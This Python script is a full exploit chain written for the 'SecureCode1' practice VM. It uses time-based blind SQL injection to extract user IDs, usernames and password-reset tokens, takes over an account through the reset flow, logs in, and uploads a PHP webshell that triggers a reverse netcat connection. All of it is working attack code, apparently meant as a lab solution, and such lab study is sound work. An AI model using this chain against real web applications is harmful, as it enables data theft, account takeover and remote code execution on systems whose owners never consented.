#!/usr/bin/python
# -*- coding: utf-8 -*-

# This script fully exploits vulnerabilities found on "SecureCode1 VM"
# Credit: VM was developed by Ahmed ElTijani (@ahmed_eltijani) for practicing

import sys
import re
import requests
from bs4 import BeautifulSoup

host = ""
protocol    = "http://"
proxies = {} #{ 'http': 'http://localhost:8080' }

def resetPassword(username):

    # Password reset request (sends an e-mail containing token)
    path        = "/login/resetPassword.php"    
    target = "%s%s%s" % (protocol, host, path)

    d = {
        "username": username,
    }

    res = requests.post(target, data=d, proxies=proxies)
    
    if "Password Reset Link has been sent" in res.text:
        print("[+] Password reset request for %s: successful" % username)
    else:
        print("[+] Password reset request: failed")

def changePassword(token, password):

    # Password change request with known token
    path        = "/login/doChangePassword.php"
    target = "%s%s%s" % (protocol, host, path)

    d = {
        "token": token,
        "password": password
    }

    res = requests.post(target, data=d, proxies=proxies)

    if ("Password Changed" in res.text):
        print("[+] Password change operation: successful")
        print("[+] Password is set to %s" % password)
    else:
        print("[-] Password change operation: failed")

def extractUniqueID(column_name, table_name, index):
    
    sql_query = "(select %s from %s limit %d,%d)" % (column_name, table_name, index-1, index)
    len_data = 10
    extracted_data = tbsqli(sql_query, column_name, len_data)
    return extracted_data

def extractArbitraryDataByID(column_name, table_name, user_id):

    sql_query = "(select %s from %s where id=%s)" % (column_name, table_name, user_id)
    len_data = 41
    extracted_data = tbsqli(sql_query, column_name, len_data)
    return extracted_data

def tbsqli(sql_query, column_name, expected_data_len):

    path        = "/item/viewItem.php"
    query       = "?id="

    extracted_data = ""
    print("[+] Extracting %s ..." % column_name)

    for i in range(1, expected_data_len + 1):

        # time-based sqli tamplate
        # Why OR / Why if(boolen,sleep(),0)
        #time_template = "1+or+IF(ascii(substring((%s),%d,1))=[CHAR],SLEEP(1),0);" % (sql_query, i)
        time_template = "1+or+IF(ascii(MID(%s,%d,1))=[CHAR],SLEEP(1),0);" % (sql_query, i)

        # printable asci set
        first = 32
        last = 126
        extracted_char = None
        for j in range(first, last):

            payload = time_template.replace("[CHAR]", str(j))
            target = "%s%s%s%s%s" % (protocol, host, path, query, payload)
            res = requests.get(target)

            # response time is the TRUE/FALSE indicator 
            if (res.elapsed.total_seconds() > 1):
                extracted_char = chr(j)
                extracted_data += extracted_char
                sys.stdout.write(extracted_char)
                sys.stdout.flush()
                break

        if not extracted_char:            
            print("\n[+] %s: %s" % (column_name, extracted_data))
            return extracted_data
        
    print("\n[-] Data extraction interrupted (potential a small expected_data_len)")
    return extracted_data

def tbsqli_test(false_payload, true_payload):

    path        = "/item/viewItem.php"
    query       = "?id="

    payloads = {false_payload: False, true_payload: True}

    response = []
    for payload, query_type in payloads.items():

        target = "%s%s%s%s%s" % (protocol, host, path, query, payload)

        res = requests.get(target)

        # response time is the TRUE/FALSE indicator 
        res_time = res.elapsed.total_seconds()

        if (query_type==False) and (res_time < 1):
            response.append(True)
        elif (query_type==True) and (res_time > 1) and (res_time > 0):
            response.append(True)
        else:
            response.append(False)

    # Check if both are True
    if len(response)==2 and len(set(response))==1 and response[0]==True:
        print("[+] Target is vulnerable to time-based blind boolean sqli!")
    else:
        print("[-] Target is NOT vulnerable to time-based blind boolean sqli!")

def tbsqli_debug():

    print("NOT implemented")

def auth_bypass(column_id, table_name, index, column_username, column_token, new_password):

    user_id = extractUniqueID(column_id, table_name, index)
    username = extractArbitraryDataByID(column_username, table_name, user_id)
    resetPassword(username)
    token = extractArbitraryDataByID(column_token, table_name, user_id)
    changePassword(token, new_password)

    return username

def rce(username, new_password, shell_file):

    sess = requests.Session()
    #sess.proxies.update(proxies)

    # Login request
    path        = "/login/checkLogin.php"
    target      = "%s%s%s" % (protocol, host, path)
    d = {
        "username": username,
        "password": new_password
    }
    sess.post(target, data=d)
    print("[+] Login attempt for given credentials: successful")

    # Request for the item pages
    path        = "/item/index.php"
    target      = "%s%s%s" % (protocol, host, path)
    res = sess.get(target)
    print("[+] Request for items page: successful")

    # Request for the edit page of the first item
    path        = '/item/' + re.findall('(?<=href=\")editItem\.php\?id=\d+(?<!\")', res.text)[0]
    print("[+] URL of the first item is extracted: (%s)" % path)
    target      = "%s%s%s" % (protocol, host, path)
    res = sess.get(target)
    print("[+] Request for edit page: successful")

    # Extract input fields (input and value) from html form 
    # "id": item_id, "id_user": id_user, "name": name, "description": description, "price": price,
    soup = BeautifulSoup(res.text, "html.parser")
    form = soup.find_all("form")[0]

    from collections import OrderedDict
    inputs = OrderedDict()
    for input_tag in form.find_all("input"):
        input_name = input_tag.attrs.get("name")
        input_value =input_tag.attrs.get("value", "")
        inputs[input_name] = input_value
    for textarea in form.findAll('textarea'):
        inputs[textarea['name']] = textarea.string or 'Hacked'
    inputs.pop("image") # remove image element which is sent seperately as a file
    inputs.pop(None)    # remove submit element which breaks request

    # Request for update item (to upload shell)
    path        = "/item/updateItem.php"
    target      = "%s%s%s" % (protocol, host, path)

    d = inputs
    f = {'image': open(shell_file, 'rb')}

    res = sess.post(target, files=f, data=d)
    if "Item data has been edited" in res.text:
        print("[+] Shell upload: successful")
    if "Failed to edit Item" in res.text:
        print("[+] Shell upload: failed")

    # Request for webshell file (to trigger reverse nc connection)
    path        = "/item/image/%s" % shell_file
    target      = "%s%s%s" % (protocol, host, path)
    res = sess.get(target)
    print("[+] Request for webshell: successful")
    print("[!] Check nc connection")

def main():
    if len(sys.argv) != 3:
        print("[*] Usage: %s <target> <payload_type>" % sys.argv[0])
        print('[*] eg: python %s sourcecode1.local debug/test/db_version/username/token/auth_bypass/rce/exploit' % sys.argv[0])
        sys.exit(-1)

    global host
    host = sys.argv[1]
    payload_type = sys.argv[2]

    if (payload_type == "test"):
        false_payload = "1"
        true_payload  = "1+or+sleep(1)"
        tbsqli_test(false_payload, true_payload)

    elif (payload_type == "db_version"):
        sql_query_dbver = "version()"
        len_version = 20
        tbsqli(payload_type, sql_query_dbver, len_version)

    elif (payload_type == "id"):
        column_name = payload_type
        table_name = "user"
        index = 1 # Extracts first id on table_name
        user_id = extractUniqueID(column_name, table_name, index)

    elif (payload_type in ["token", "username", "password"]):
        column_name = payload_type
        table_name = "user"
        user_id = 1 # Extracts arbitrary data of the user_id from table_name 
        token = extractArbitraryDataByID(column_name, table_name, user_id)

    elif (payload_type == "auth_bypass"):
        column_id = "id"
        table_name = "user"
        index = 1 # Extracts first id on table_name
        column_username = "username"
        column_token = "token"
        new_password = "123456"
        auth_bypass(column_id, table_name, index, column_username, column_token, new_password)

    elif (payload_type == "rce"):
        username = "admin"
        new_password = "123456"
        webshell = "shell.phar"
        rce(username, new_password, webshell)

    elif (payload_type == "exploit"):
        column_id = "id"
        table_name = "user"
        index = 1 # Extracts first id on table_name
        column_username = "username"
        column_token = "token"
        new_password = "123456"
        username = auth_bypass(column_id, table_name, index, column_username, column_token, new_password)
        webshell = "shell.phar"
        rce(username, new_password, webshell)


if __name__ == "__main__":
    main()
